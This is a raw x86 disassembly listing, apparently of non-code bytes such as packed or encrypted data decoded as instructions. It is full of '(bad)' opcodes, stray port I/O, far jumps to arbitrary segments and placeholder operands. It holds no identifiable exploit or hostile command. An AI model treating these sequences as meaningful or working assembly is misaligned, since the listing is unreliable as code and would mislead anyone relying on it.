  41b64b:	and    al,0x8c
  41b64d:	pop    ebx
  41b64e:	or     ah,al
  41b650:	push   0x64cafd58
  41b655:	mov    eax,0xbc466e79
  41b65a:	inc    eax
  41b65c:	cmp    eax,0xfedfebc7
  41b661:	xchg   edi,eax
  41b662:	rcr    esi,0xf2
  41b665:	pusha  
  41b666:	mov    dh,0x3
  41b668:	stos   BYTE PTR es:[edi],al
  41b669:	inc    ecx
  41b66a:	or     DWORD PTR [edi+0x42b272e2],ebx
  41b670:	inc    ebx
  41b671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b672:	leave  
  41b673:	xchg   esi,eax
  41b674:	jae    0x41b672
  41b676:	hlt    
  41b677:	xor    ebx,edi
  41b679:	mov    dl,0xc5
  41b67b:	sahf   
  41b67c:	enter  0x4947,0x86
  41b680:	in     al,dx
  41b681:	clc    
  41b682:	sub    al,0x24
  41b684:	xor    dl,dl
  41b686:	repz sti 
  41b688:	xchg   esi,eax
  41b689:	mov    ax,WORD PTR [esi+0xf9037ed]
  41b690:	xor    ah,BYTE PTR [ecx+0x3a7b924e]
  41b696:	add    al,BYTE PTR [eax-0xd]
  41b699:	icebp  
  41b69a:	pop    edi
  41b69b:	jns    0x41b669
  41b69d:	(bad)  
  41b69e:	out    dx,al
  41b69f:	push   ebp
  41b6a0:	mov    ebx,0x59189e3a
  41b6a5:	aaa    
  41b6a6:	xchg   edx,eax
  41b6a7:	mov    eax,ds:0x807f4203
  41b6ac:	int    0xfd
  41b6ae:	es repz aad 0xca
  41b6b2:	dec    ebx
  41b6b3:	fidivr WORD PTR [ebp+0x61]
  41b6b6:	(bad)  
  41b6b7:	xchg   edi,eax
  41b6b8:	sub    al,0xa9
  41b6ba:	outs   dx,DWORD PTR ds:[esi]
  41b6bb:	sar    BYTE PTR [esi],1
  41b6bd:	xor    eax,DWORD PTR [esi]
  41b6bf:	mov    dl,ch
  41b6c1:	jecxz  0x41b738
  41b6c3:	sti    
  41b6c4:	inc    edx
  41b6c5:	loop   0x41b64d
  41b6c7:	mov    esi,0x574c4b4e
  41b6cc:	pop    ds
  41b6cd:	pop    esp
  41b6ce:	and    al,0x3e
  41b6d0:	fst    DWORD PTR [ebp+0x27]
  41b6d3:	aad    0x52
  41b6d5:	push   edx
  41b6d6:	shl    BYTE PTR [ebx-0x49],cl
  41b6d9:	pop    ecx
  41b6da:	repz xor DWORD PTR [esp+ebx*1],esp
  41b6de:	aam    0x57
  41b6e0:	stc    
  41b6e1:	adc    esi,DWORD PTR [eax+0x4a4eeb36]
  41b6e7:	test   DWORD PTR [ecx],edi
  41b6e9:	scas   eax,DWORD PTR es:[edi]
  41b6ea:	call   0x7b33:0xb5caeb53
  41b6f1:	push   edi
  41b6f2:	push   cs
  41b6f3:	push   ss
  41b6f4:	jl     0x41b6d2
  41b6f6:	arpl   WORD PTR [edx+0x1ce5214b],si
  41b6fc:	popf   
  41b6fd:	shl    DWORD PTR [ecx],cl
  41b6ff:	dec    ecx
  41b700:	lods   eax,DWORD PTR ds:[esi]
  41b701:	lahf   
  41b702:	ins    BYTE PTR es:[edi],dx
  41b703:	xchg   ebx,eax
  41b704:	push   edi
  41b705:	add    dl,al
  41b707:	and    esp,DWORD PTR [ecx]
  41b709:	jae    0x41b6c7
  41b70b:	lock enter 0xe118,0xe1
  41b710:	addr16 inc ecx
  41b712:	sub    eax,0x53ba8c15
  41b717:	ss push es
  41b719:	xor    BYTE PTR [eax-0x6d],dh
  41b71c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b71d:	push   esi
  41b71e:	jns    0x41b6dd
  41b720:	ficom  WORD PTR [edi+0x7e]
  41b723:	mov    dl,BYTE PTR [esi]
  41b725:	je     0x41b73f
  41b727:	les    esp,FWORD PTR [eax]
  41b729:	lea    esi,[edx+0x26]
  41b72c:	sbb    BYTE PTR [esp+eiz*4-0x7c],bh
  41b730:	mov    edi,0x366079a0
  41b735:	pop    esp
  41b736:	pop    esi
  41b737:	scas   al,BYTE PTR es:[edi]
  41b738:	xchg   ecx,eax
  41b739:	fld    QWORD PTR [ecx]
  41b73b:	ret    0x64b1
  41b73e:	sahf   
  41b73f:	add    bl,BYTE PTR [esi+0xc]
  41b742:	in     eax,dx
  41b743:	and    DWORD PTR [esi-0x22],edi
  41b746:	mov    bl,0xc8
  41b748:	cmp    eax,eax
  41b74a:	rcr    DWORD PTR [edx+esi*2-0x13d68d0c],0x36
  41b752:	or     al,0xee
  41b754:	stos   DWORD PTR es:[edi],eax
  41b755:	popa   
  41b756:	sub    al,0x10
  41b758:	sub    edi,eax
  41b75a:	inc    edx
  41b75b:	call   0x1a6a:0xccc784c7
  41b762:	pop    edi
  41b763:	add    eax,0x960cd961
  41b768:	in     eax,dx
  41b769:	jmp    0x41b774
  41b76b:	push   eax
  41b76c:	(bad)  
  41b76d:	int    0x76
  41b76f:	mov    al,0xe9
  41b771:	cmp    ebp,0x97aa8e5a
  41b777:	push   0x6e68ec6e
  41b77c:	ret    0xa4df
  41b77f:	sbb    dl,BYTE PTR [edi+0x5ce82ca8]
  41b785:	in     eax,dx
  41b786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b788:	cmc    
  41b789:	ror    al,1
  41b78b:	rol    BYTE PTR [ecx+eiz*8+0x5c051e2e],cl
  41b792:	cs adc ecx,ecx
  41b795:	std    
  41b796:	jnp    0x41b72d
  41b798:	jno    0x41b736
  41b79a:	sbb    eax,0xf40d8aa0
  41b79f:	shl    BYTE PTR [esi+0x21],cl
  41b7a2:	dec    esp
  41b7a3:	mov    dl,0x5a
  41b7a5:	sbb    eax,0x88402bb1
  41b7aa:	(bad)  
  41b7ab:	push   eax
  41b7ac:	sub    eax,0x24ba3b7b
  41b7b1:	xchg   ebx,eax
  41b7b2:	lock xor cl,BYTE PTR [edi-0x39d27a8d]
  41b7b9:	mov    DWORD PTR [eax+0x6e],edi
  41b7bc:	ret    
  41b7bd:	in     al,0xd8
  41b7bf:	retf   0x860d
  41b7c2:	cmc    
  41b7c3:	pushf  
  41b7c4:	sbb    ebx,DWORD PTR [edx+0xd574e3e]
  41b7ca:	inc    eax
  41b7cb:	loop   0x41b821
  41b7cd:	xchg   bh,bh
  41b7cf:	push   0x260208d8
  41b7d4:	mov    ebp,0xef3901ac
  41b7d9:	test   DWORD PTR [edx],esi
  41b7db:	cdq    
  41b7dc:	cs dec edi
  41b7de:	xor    ebp,DWORD PTR [esi+eax*4+0x3fc32105]
  41b7e5:	mov    eax,ds:0xf024a56f
  41b7ea:	je     0x41b817
  41b7ec:	add    DWORD PTR [ecx-0x78],edi
  41b7ef:	sbb    cl,0x97
  41b7f2:	cdq    
  41b7f3:	stc    
  41b7f4:	cld    
  41b7f5:	xchg   cl,al
  41b7f7:	ror    bl,1
  41b7f9:	mov    ch,0xde
  41b7fb:	cmp    ah,BYTE PTR [ebp-0x5bdc3e64]
  41b801:	xchg   ebp,eax
  41b802:	repz pop ds
  41b804:	inc    edi
  41b805:	adc    DWORD PTR [ecx+0x44],0x50595708
  41b80c:	mov    WORD PTR [edi+0x30],cs
  41b80f:	push   edx
  41b810:	loope  0x41b853
  41b812:	addr16 mov dh,0xc5
  41b815:	test   al,0xe8
  41b817:	cwde   
  41b818:	push   ds
  41b819:	jmp    0xc1249f90
  41b81e:	jge    0x41b7bf
  41b820:	mov    BYTE PTR [edx],bl
  41b822:	adc    al,0x81
  41b824:	xor    al,0xa9
  41b826:	(bad)  
  41b827:	in     eax,dx
  41b828:	or     BYTE PTR [edi],ch
  41b82a:	(bad)  
  41b82b:	addr16 int 0x25
  41b82e:	in     eax,0x99
  41b830:	or     eax,DWORD PTR gs:[eax+ecx*8]
  41b834:	sbb    eax,DWORD PTR [ecx-0x6a]
  41b837:	jae    0x41b867
  41b839:	addr16 sahf 
  41b83b:	adc    DWORD PTR [ecx+0x3680af5d],0x62
  41b842:	mov    cl,0xc6
  41b844:	scas   eax,DWORD PTR es:[edi]
  41b845:	jbe    0x41b82c
  41b847:	pop    esp
  41b848:	ror    DWORD PTR [ecx],0xf0
  41b84b:	dec    esp
  41b84c:	mul    BYTE PTR [eax+0x61]
  41b84f:	jmp    0x8155033e
  41b854:	fdivrp st(7),st
  41b856:	jg     0x41b80c
  41b858:	aam    0xc4
  41b85a:	mov    bh,0xec
  41b85c:	addr16 and si,bx
  41b860:	(bad)  
  41b862:	sub    edx,DWORD PTR [ecx+0x2583fffc]
  41b868:	shr    DWORD PTR [edx],0xd0
  41b86b:	ror    dl,0xbb
  41b86e:	(bad)  
  41b86f:	std    
  41b870:	sub    DWORD PTR [ecx+0x24],0xccac0c19
  41b877:	lahf   
  41b878:	mov    al,ds:0x6530b1d1
  41b87d:	shl    bh,0xc4
  41b880:	outs   dx,DWORD PTR ds:[esi]
  41b881:	lds    ecx,FWORD PTR [ebx-0x60e1c72f]
  41b887:	mov    WORD PTR [edi],ss
  41b889:	xlat   BYTE PTR ds:[ebx]
  41b88a:	popa   
  41b88b:	dec    ebp
  41b88c:	push   edx
  41b88d:	rol    DWORD PTR fs:[ebx-0x3d],0x89
  41b892:	fbstp  TBYTE PTR [eax+0x47b3d50d]
  41b898:	cmp    ebp,ebx
  41b89a:	mov    ds:0xffdb79ad,eax
  41b89f:	std    
  41b8a0:	and    DWORD PTR [ebx+0x551423af],esp
  41b8a6:	push   cs
  41b8a7:	scas   eax,DWORD PTR es:[edi]
  41b8a8:	imul   esi,ecx,0xffffffe7
  41b8ab:	retf   0xfd48
  41b8ae:	(bad)  
  41b8af:	test   al,0x2a
  41b8b1:	dec    edx
  41b8b2:	(bad)  
  41b8b3:	xchg   esp,eax
  41b8b4:	je     0x41b883
  41b8b6:	pop    ds
  41b8b7:	idiv   bh
  41b8b9:	or     al,0xd8
  41b8bb:	jno    0x41b8aa
  41b8bd:	cmp    DWORD PTR ds:0x8250979c,edx
  41b8c3:	das    
  41b8c4:	(bad)  
  41b8c5:	cmp    dl,BYTE PTR [ecx]
  41b8c7:	jp     0x41b91c
  41b8c9:	jge    0x41b90f
  41b8cb:	mov    ah,0xcd
  41b8cd:	int3   
  41b8ce:	fisubr WORD PTR gs:[eax+0x1d]
  41b8d2:	int    0xfc
  41b8d4:	icebp  
  41b8d5:	push   ss
  41b8d6:	cdq    
  41b8d7:	push   ecx
  41b8d8:	imul   edi,DWORD PTR [eax+0x1382c2e0],0xffffffd3
  41b8df:	not    DWORD PTR [eax+0x7c]
  41b8e2:	in     eax,0xb
  41b8e4:	inc    edi
  41b8e5:	and    BYTE PTR [eax-0x5f28ebd3],cl
  41b8eb:	dec    ecx
  41b8ec:	into   
  41b8ed:	std    
  41b8ee:	mov    WORD PTR [eax+0x58397140],ds
  41b8f4:	aaa    
  41b8f5:	daa    
  41b8f6:	ss test al,0x42
  41b8f9:	inc    ecx
  41b8fa:	inc    bh
  41b8fc:	pop    eax
  41b8fd:	jnp    0x41b938
  41b8ff:	(bad)  
  41b900:	jnp    0x41b92e
  41b902:	test   edx,edx
  41b904:	xor    BYTE PTR [edx],dh
  41b906:	jne    0x41b943
  41b908:	mov    ecx,0x14050491
  41b90d:	sti    
  41b90e:	xchg   esp,eax
  41b90f:	mov    eax,ds:0x194d63b0
  41b914:	cdq    
  41b915:	dec    esp
  41b916:	cmp    ch,dl
  41b918:	mov    bh,0x44
  41b91a:	popa   
  41b91b:	outs   dx,BYTE PTR ds:[esi]
  41b91c:	js     0x41b924
  41b91e:	sahf   
  41b91f:	leave  
  41b920:	jg     0x41b98d
  41b922:	pop    eax
  41b923:	mul    DWORD PTR [ebx-0x21]
  41b926:	into   
  41b927:	cmp    bh,BYTE PTR [ebx+0x36]
  41b92a:	scas   al,BYTE PTR es:[edi]
  41b92b:	and    eax,0xeecda049
  41b930:	mov    ebx,DWORD PTR [ebx]
  41b932:	sub    al,0xbd
  41b934:	mov    eax,ds:0xb15f4b99
  41b939:	xchg   DWORD PTR [esi-0x4f],esp
  41b93c:	shr    DWORD PTR [eax],cl
  41b93e:	sahf   
  41b93f:	es cmp bl,dl
  41b942:	repnz (bad) 
  41b944:	xor    DWORD PTR [edi],ebp
  41b946:	mov    al,ds:0xdcf58f4d
  41b94b:	int3   
  41b94c:	push   ss
  41b94d:	mov    ebx,0x6330f19f
  41b952:	popa   
  41b953:	jmp    0xbd1548e9
  41b958:	xchg   edx,eax
  41b959:	pop    eax
  41b95a:	or     ebp,DWORD PTR [edi-0x4b661c28]
  41b960:	ins    BYTE PTR es:[edi],dx
  41b961:	mov    ch,0xcc
  41b963:	nop
  41b964:	rcl    DWORD PTR [ebx+0x6166331a],cl
  41b96a:	fldenv [edx-0x31f66d7]
  41b970:	adc    BYTE PTR [edx-0x75b39bc2],0x8d
  41b977:	ss rol bh,0x18
  41b97b:	out    0x1b,al
  41b97d:	sbb    BYTE PTR [eax+0x6e4a756b],bh
  41b983:	arpl   WORD PTR [ebx-0x106d47d4],di
  41b989:	imul   eax,DWORD PTR [edx+eax*1],0xec5f7411
  41b990:	popa   
  41b991:	push   esi
  41b992:	mov    ah,0xd8
  41b994:	add    bl,dh
  41b996:	jp     0x41b91d
  41b998:	cmp    BYTE PTR [ebx*4+0x3f41276a],ah
  41b99f:	aas    
  41b9a0:	aaa    
  41b9a1:	fs sahf 
  41b9a3:	jmp    0x41ba05
  41b9a5:	nop
  41b9a6:	xor    al,0x79
  41b9a8:	mov    DWORD PTR [ecx],edi
  41b9aa:	cmp    DWORD PTR [ecx-0x3e],edi
  41b9ad:	fisubr WORD PTR [eax-0x504f7671]
  41b9b3:	iret   
  41b9b4:	cmc    
  41b9b5:	pop    edi
  41b9b7:	push   0x0
  41b9b9:	mov    bl,0xe9
  41b9bb:	mov    DWORD PTR [esi],esp
  41b9bd:	add    esp,DWORD PTR [ebx-0x58287a8f]
  41b9c3:	es and al,0xfb
  41b9c6:	adc    ebp,DWORD PTR [ebx]
  41b9c8:	xchg   edx,eax
  41b9c9:	or     al,0x46
  41b9cb:	sub    DWORD PTR ss:[esi-0x280aaa9a],ebx
  41b9d2:	sbb    cl,BYTE PTR [edi]
  41b9d4:	mov    eax,ds:0xd54b916f
  41b9d9:	inc    edi
  41b9da:	inc    esi
  41b9db:	frstor [ebx]
  41b9dd:	dec    edi
  41b9de:	xchg   edx,eax
  41b9df:	outs   dx,BYTE PTR ds:[esi]
  41b9e0:	adc    eax,0xe85bb7e9
  41b9e5:	sub    al,0xbf
  41b9e7:	xchg   BYTE PTR [edx],bl
  41b9e9:	sub    DWORD PTR [ebx-0x46b1ae22],0x1659585c
  41b9f3:	xor    al,ah
  41b9f5:	pusha  
  41b9f6:	fistp  DWORD PTR [ebp+eiz*4+0x11]
  41b9fa:	sbb    al,0x74
  41b9fc:	mov    cl,0x65
  41b9fe:	mov    cl,0x5f
  41ba00:	ret    
  41ba01:	mov    al,0xc3
  41ba03:	xor    al,0x78
  41ba05:	icebp  
  41ba06:	scas   al,BYTE PTR es:[edi]
  41ba07:	aad    0x35
  41ba09:	adc    bh,al
  41ba0b:	xchg   DWORD PTR [ecx+0x265c5dfb],edi
  41ba11:	sbb    esp,DWORD PTR [eax]
  41ba13:	fadd   QWORD PTR [edx+0x43ae16ec]
  41ba19:	into   
  41ba1a:	ror    DWORD PTR [ecx+ebp*8-0x31],0xc
  41ba1f:	mov    esi,0xd45687d4
  41ba24:	out    dx,eax
  41ba25:	es mov al,dh
  41ba28:	test   al,0x53
  41ba2a:	pop    es
  41ba2b:	adc    DWORD PTR [eax-0x71f85d6a],0x12
  41ba32:	cmc    
  41ba33:	sahf   
  41ba34:	mov    cl,0x18
  41ba36:	(bad)
  41ba39:	sti    
  41ba3a:	lea    edi,[ebx+0x101e2507]
  41ba40:	iret   
  41ba41:	arpl   WORD PTR [eax+0x11],si
  41ba44:	add    esi,ebx
  41ba46:	enter  0x25b8,0x7b
  41ba4a:	mov    BYTE PTR [edi-0x12eb646f],ch
  41ba50:	out    0x5a,al
  41ba52:	aaa    
  41ba53:	call   0x4670d181
  41ba58:	jge    0x41b9f0
  41ba5a:	loop   0x41ba9b
  41ba5c:	(bad)  
  41ba5e:	aam    0xa5
  41ba60:	test   BYTE PTR [esi],dl
  41ba62:	call   0x63a:0x63920796
  41ba69:	pushf  
  41ba6a:	sbb    eax,0x21ae3d31
  41ba6f:	nop
  41ba70:	outs   dx,BYTE PTR ds:[esi]
  41ba71:	pop    edx
  41ba72:	cmp    BYTE PTR [esi+ebx*4-0x7af71595],cl
  41ba79:	pushf  
  41ba7a:	xor    BYTE PTR [esi-0x89e07],bh
  41ba80:	out    0xc1,al
  41ba82:	xchg   ebx,eax
  41ba83:	mov    WORD PTR [ecx],?
  41ba85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba86:	js     0x41ba72
  41ba88:	pop    ss
  41ba89:	xchg   edx,eax
  41ba8a:	pop    ebx
  41ba8b:	cdq    
  41ba8c:	push   ebp
  41ba8d:	mov    dh,0x83
  41ba8f:	jecxz  0x41bafc
  41ba91:	stc    
  41ba92:	and    DWORD PTR [edi+0x15],esp
  41ba95:	dec    edx
  41ba96:	push   0x56070f9f
  41ba9b:	cmc    
  41ba9c:	je     0x41bb09
  41ba9e:	in     eax,0xc2
  41baa0:	fmul   DWORD PTR [esi]
  41baa2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41baa4:	push   edx
  41baa5:	in     eax,dx
  41baa6:	xor    bl,ch
  41baa8:	iret   
  41baa9:	mov    esp,0x86c5237f
  41baae:	stos   BYTE PTR es:[edi],al
  41baaf:	xor    BYTE PTR [edx+0x5a2c03e9],ch
  41bab5:	idiv   DWORD PTR [ebx+0x14b24508]
  41babb:	mov    ecx,0xd45bb531
  41bac0:	pop    eax
  41bac1:	ffreep st(6)
  41bac3:	jae    0x41bb00
  41bac5:	popf   
  41bac6:	popa   
  41bac7:	dec    ebx
  41bac8:	pop    ecx
  41bac9:	and    ch,bh
  41bacb:	lods   eax,DWORD PTR ds:[esi]
  41bacc:	in     eax,0x54
  41bace:	dec    edx
  41bacf:	call   0x5b11c7c5
  41bad4:	loop   0x41bb46
  41bad6:	scas   al,BYTE PTR es:[edi]
  41bad7:	fs sahf 
  41bad9:	je     0x41ba6a
  41badb:	cmp    BYTE PTR [ecx],dh
  41badd:	dec    edi
  41bade:	sub    eax,0xdb3ae734
  41bae3:	daa    
  41bae4:	xchg   BYTE PTR [ecx-0x7b],al
  41bae7:	mov    ?,WORD PTR [edi+0x3c9c096d]
  41baed:	push   ss
  41baee:	xor    ah,bl
  41baf0:	cmp    eax,0x6b316f86
  41baf5:	bound  esp,QWORD PTR [edi-0x745bb843]
  41bafb:	jo     0x41badd
  41bafd:	dec    ecx
  41bafe:	xor    eax,0x7907b66d
  41bb03:	pop    esp
  41bb04:	xlat   BYTE PTR ds:[ebx]
  41bb05:	and    BYTE PTR [ecx-0x4e7786e8],0x8f
  41bb0c:	es in  eax,0xd5
  41bb0f:	sbb    cl,BYTE PTR [edx]
  41bb11:	nop
  41bb12:	jmp    0x41ba97
  41bb14:	test   BYTE PTR [ecx],ah
  41bb16:	push   edi
  41bb17:	aad    0xce
  41bb19:	adc    DWORD PTR [edx],edx
  41bb1b:	jmp    0x245a:0xd07ec23d
  41bb22:	lea    edi,[edi+ecx*1+0xd657a9d]
  41bb29:	xchg   ebp,eax
  41bb2a:	popf   
  41bb2b:	addr16 dec ecx
  41bb2d:	lds    esp,FWORD PTR [ecx+0x5687461b]
  41bb33:	sbb    ebp,DWORD PTR [eax+0x21953884]
  41bb39:	mov    al,0x86
  41bb3b:	adc    DWORD PTR [ebx+0x54],esp
  41bb3e:	jnp    0x41bae9
  41bb40:	in     eax,0x53
  41bb42:	mov    BYTE PTR [ebx],dl
  41bb44:	jp     0x41bbc4
  41bb46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb47:	enter  0xf6e4,0xae
  41bb4b:	cwde   
  41bb4c:	push   edx
  41bb4d:	outs   dx,DWORD PTR ds:[esi]
  41bb4e:	lods   eax,DWORD PTR ds:[esi]
  41bb4f:	mov    dl,0xd5
  41bb51:	push   ebx
  41bb52:	sub    esi,0x71ef24c0
  41bb58:	push   es
  41bb59:	je     0x41bb0c
  41bb5b:	xchg   ebx,eax
  41bb5c:	jb     0x41bb7d
  41bb5e:	test   DWORD PTR [ebp-0xc444713],0x806b9f8f
  41bb68:	xchg   edx,eax
  41bb69:	mov    esi,0x1defac9e
  41bb6e:	loopne 0x41bb1d
  41bb70:	lock pop ds
  41bb72:	addr16 dec esi
  41bb74:	mov    ah,BYTE PTR [eax+edi*2-0x24]
  41bb78:	cli    
  41bb79:	push   edx
  41bb7a:	jp     0x41bbd6
  41bb7c:	lods   eax,DWORD PTR ds:[esi]
  41bb7d:	rol    DWORD PTR ds:0xb17db85b,cl
  41bb83:	add    DWORD PTR [edx-0x1e1a72f5],0x3d
  41bb8a:	dec    eax
  41bb8b:	les    esp,FWORD PTR [ebx+0x32]
  41bb8e:	mov    al,0x9f
  41bb90:	push   ebp
  41bb91:	out    dx,al
  41bb92:	mov    ds,WORD PTR [esp+ecx*2+0x2a]
  41bb96:	cmp    BYTE PTR [ebx+0x7d],al
  41bb99:	mov    edx,0x41091522
  41bb9e:	jg     0x41bba5
  41bba0:	data16 and dh,BYTE PTR [esi]
  41bba3:	test   al,0x45
  41bba5:	imul   edx,DWORD PTR [ebx],0x9c036d60
  41bbab:	call   0x9b4f746a
  41bbb0:	(bad)  
  41bbb1:	lahf   
  41bbb2:	sub    bl,BYTE PTR [ebp-0x4]
  41bbb5:	imul   edi,DWORD PTR [ebx+0x4],0x6f
  41bbb9:	in     al,dx
  41bbba:	shr    DWORD PTR [edi-0x332465a9],cl
  41bbc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc1:	or     al,0x11
  41bbc3:	ret    
  41bbc4:	or     esi,edx
  41bbc6:	xlat   BYTE PTR ds:[ebx]
  41bbc7:	or     bh,BYTE PTR [edi]
  41bbc9:	mov    esi,0xba6cde2a
  41bbce:	loop   0x41bb8e
  41bbd0:	sahf   
  41bbd1:	lods   al,BYTE PTR ds:[esi]
  41bbd2:	jle    0x41bb80
  41bbd4:	pop    esi
  41bbd5:	push   cs
  41bbd6:	mov    dh,0xdc
  41bbd8:	pop    ds
  41bbd9:	pop    gs
  41bbdb:	sub    ch,0x99
  41bbde:	jbe    0x41bb8b
  41bbe0:	lock rol DWORD PTR [ecx],cl
  41bbe3:	les    eax,FWORD PTR [ebp-0x76eb1388]
  41bbe9:	dec    esp
  41bbea:	pop    ebp
  41bbeb:	inc    edx
  41bbec:	dec    esp
  41bbed:	idiv   BYTE PTR [eax+0x43a3348f]
  41bbf3:	jbe    0x41bc29
  41bbf5:	dec    edi
  41bbf6:	aaa    
  41bbf7:	inc    ebp
  41bbf8:	push   ebx
  41bbf9:	nop
  41bbfa:	dec    ebp
  41bbfb:	xchg   DWORD PTR [ecx+eiz*2+0x1],eax
  41bbff:	clc    
  41bc00:	lea    ebx,[eax+0x46ad4bf6]
  41bc06:	mov    edi,0xfc9952c2
  41bc0b:	cli    
  41bc0c:	je     0x41bbbd
  41bc0e:	cs mov bl,0x91
  41bc11:	sub    al,0xd1
  41bc13:	sti    
  41bc14:	out    0xc1,eax
  41bc16:	dec    ebp
  41bc17:	je     0x41bc35
  41bc19:	shr    DWORD PTR [eax+0x50],1
  41bc1c:	mov    eax,ds:0xa0abbb61
  41bc21:	jmp    DWORD PTR [eax-0x7e03b682]
  41bc27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc28:	lods   al,BYTE PTR ds:[esi]
  41bc29:	loopne 0x41bc11
  41bc2b:	out    0xd0,al
  41bc2d:	mov    eax,ds:0xbd6e510
  41bc32:	sub    eax,0x6b2487ba
  41bc37:	lea    eax,[edx+0x16fd78a9]
  41bc3d:	ins    BYTE PTR es:[edi],dx
  41bc3e:	mov    ecx,0x6d73033d
  41bc43:	inc    eax
  41bc44:	not    BYTE PTR [esi-0x1]
  41bc47:	cmp    dh,ch
  41bc49:	adc    DWORD PTR [ecx+0x44b76178],esp
  41bc4f:	mov    ecx,0xe13912a8
  41bc54:	ficom  DWORD PTR [esi]
  41bc56:	cli    
  41bc57:	fst    QWORD PTR [esi]
  41bc59:	lods   al,BYTE PTR ds:[esi]
  41bc5a:	int3   
  41bc5b:	dec    edi
  41bc5c:	fwait
  41bc5d:	adc    ebx,ebx
  41bc5f:	loope  0x41bbfb
  41bc61:	adc    bl,BYTE PTR [ebx]
  41bc63:	cwde   
  41bc64:	shr    esp,cl
  41bc66:	push   edi
  41bc67:	aas    
  41bc68:	xor    al,0xf4
  41bc6a:	ret    0x6ca0
  41bc6d:	pop    ss
  41bc6e:	pop    edi
  41bc6f:	adc    DWORD PTR [edi],eax
  41bc71:	fidiv  WORD PTR ds:0xc6ab9852
  41bc77:	stos   BYTE PTR es:[edi],al
  41bc78:	dec    esi
  41bc79:	xchg   ecx,eax
  41bc7a:	ss or  eax,eax
  41bc7d:	call   0x10e3:0xca52d1ab
  41bc84:	mov    al,ds:0xdd9c41a
  41bc89:	rol    ecx,0x38
  41bc8c:	jb     0x41bcbb
  41bc8e:	mov    WORD PTR [edi-0xf],ds
  41bc91:	lea    esp,[esi-0x17]
  41bc94:	pop    ss
  41bc95:	push   esi
  41bc96:	(bad)  
  41bc97:	inc    esi
  41bc98:	adc    DWORD PTR [ebp-0x76],ecx
  41bc9b:	js     0x41bc49
  41bc9d:	stc    
  41bc9e:	jne    0x41bca1
  41bca0:	aam    0x2f
  41bca2:	test   DWORD PTR [esi],ecx
  41bca4:	nop
  41bca5:	call   0xfe7d:0xff845542
  41bcac:	jmp    0x920e:0x9287e526
  41bcb3:	add    DWORD PTR [ecx+0x6cea94f6],ebx
  41bcb9:	dec    edx
  41bcba:	sbb    eax,0x6d4053ff
  41bcbf:	xchg   esp,eax
  41bcc0:	les    ebx,FWORD PTR [eax+0x41]
  41bcc3:	aam    0x50
  41bcc5:	mov    dh,0x54
  41bcc7:	ret    
  41bcc8:	push   cs
  41bcc9:	push   eax
  41bcca:	jnp    0x41bca0
  41bccc:	mov    edx,0xd0ea259f
  41bcd1:	mov    eax,ds:0x4aca510
  41bcd6:	ds jno 0x41bd3e
  41bcd9:	or     BYTE PTR [eax-0x61],ch
  41bcdc:	pop    esp
  41bcdd:	push   ds
  41bcde:	cmp    BYTE PTR [ebp-0x2e],ch
  41bce1:	inc    ebx
  41bce2:	out    dx,eax
  41bce3:	sahf   
  41bce4:	pop    ds
  41bce5:	pop    es
  41bce6:	ds idiv edx
  41bce9:	shr    DWORD PTR [ebp-0x76],1
  41bcec:	jb     0x41bd10
  41bcee:	mov    ch,BYTE PTR [ebp+0x243f7775]
  41bcf4:	sbb    eax,0x87f5f088
  41bcf9:	mov    dl,0xc8
  41bcfb:	adc    BYTE PTR [esi],0xc4
  41bcfe:	stc    
  41bcff:	sub    eax,0xde113ec8
  41bd04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd05:	mov    esi,0x7ef98e2
  41bd0a:	cs gs pop edi
  41bd0d:	and    al,0xd0
  41bd0f:	rcl    BYTE PTR [esi+0x1a],cl
  41bd12:	retf   0x2035
  41bd15:	mov    WORD PTR [ebp-0x21],es
  41bd18:	jl     0x41bd3f
  41bd1a:	adc    DWORD PTR [edx+0x47],esp
  41bd1d:	mov    eax,ds:0x800699ed
  41bd22:	or     al,0x60
  41bd24:	cmp    eax,0x72083f32
  41bd29:	fstp   QWORD PTR [edx-0x6d34c804]
  41bd2f:	(bad)  
  41bd31:	retf   0x52ce
  41bd34:	ror    DWORD PTR [eax],0x66
  41bd37:	xor    BYTE PTR [ebp+0x68e0c934],dh
  41bd3d:	loope  0x41bd6e
  41bd3f:	pop    edx
  41bd40:	daa    
  41bd41:	jb     0x41bd10
  41bd43:	jne    0x41bce1
  41bd45:	xor    al,0xce
  41bd47:	dec    edi
  41bd48:	out    0x28,al
  41bd4a:	ins    DWORD PTR es:[edi],dx
  41bd4b:	repnz aam 0xe4
  41bd4e:	aad    0xc6
  41bd50:	gs sahf 
  41bd52:	mov    edx,0x534e0c17
  41bd57:	retf   
  41bd58:	adc    bl,BYTE PTR [ebp+0x44]
  41bd5b:	adc    ebp,ecx
  41bd5d:	mov    dl,0xe5
  41bd5f:	aaa    
  41bd60:	sti    
  41bd61:	add    esi,DWORD PTR [ebp+0x6f60f8fd]
  41bd67:	pusha  
  41bd68:	dec    edi
  41bd69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd6a:	sub    ah,bh
  41bd6c:	and    BYTE PTR [eax-0x49],al
  41bd6f:	inc    esi
  41bd70:	push   ss
  41bd71:	cmp    al,0x4c
  41bd73:	xchg   ebp,eax
  41bd74:	push   esi
  41bd75:	mov    esp,0x4623cb96
  41bd7a:	or     ebp,ecx
  41bd7c:	mov    ah,0x63
  41bd7e:	test   eax,0x7634adce
  41bd83:	mov    ecx,0x249c7250
  41bd88:	cmp    DWORD PTR [edi-0x1a],esp
  41bd8b:	fld    DWORD PTR [ebx]
  41bd8d:	int3   
  41bd8e:	clc    
  41bd8f:	imul   esi,DWORD PTR [ebp+0x7],0x72
  41bd93:	in     al,0x83
  41bd95:	lock xchg ch,dl
  41bd98:	push   esi
  41bd99:	shl    bh,0xed
  41bd9c:	add    DWORD PTR ds:0x55f5e61d,eax
  41bda2:	nop
  41bda3:	xchg   esi,eax
  41bda4:	mov    cl,0x66
  41bda6:	mov    eax,0x2559ec7
  41bdac:	mov    eax,0xafde3
  41bdb1:	xor    al,dl
  41bdb3:	inc    esi
  41bdb4:	les    ebp,FWORD PTR [eax]
  41bdb6:	inc    edi
